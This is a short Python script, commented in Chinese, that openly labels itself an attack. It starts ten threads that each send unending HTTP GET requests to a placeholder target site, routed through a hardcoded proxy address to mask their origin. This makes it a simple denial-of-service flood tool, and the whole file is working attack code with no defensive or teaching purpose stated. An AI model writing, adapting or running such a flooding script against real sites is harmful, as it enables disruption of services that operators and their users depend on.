import requests
import threading

# 目標網站的URL
target_url = "http://example.com"

# 定義攻擊函數
def attack():
    while True:
        # 發送請求給目標網站
        try:
            proxies = {
                'http': 'http://72.206.181.105:64935',
                'https': 'http://72.206.181.105:64935'
            }
            response = requests.get(target_url, proxies=proxies)
            print("Request sent")
        except requests.exceptions.RequestException as e:
            print("Error:", e)

# 創建多個攻擊執行緒
num_threads = 10  # 執行緒數量
threads = []

for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True  # 設置為守護執行緒，當主執行緒退出時，這些執行緒也會退出
    threads.append(thread)

# 啟動攻擊執行緒
for thread in threads:
    thread.start()

# 等待所有執行緒結束
for thread in threads:
    thread.join()

print("Attack finished")
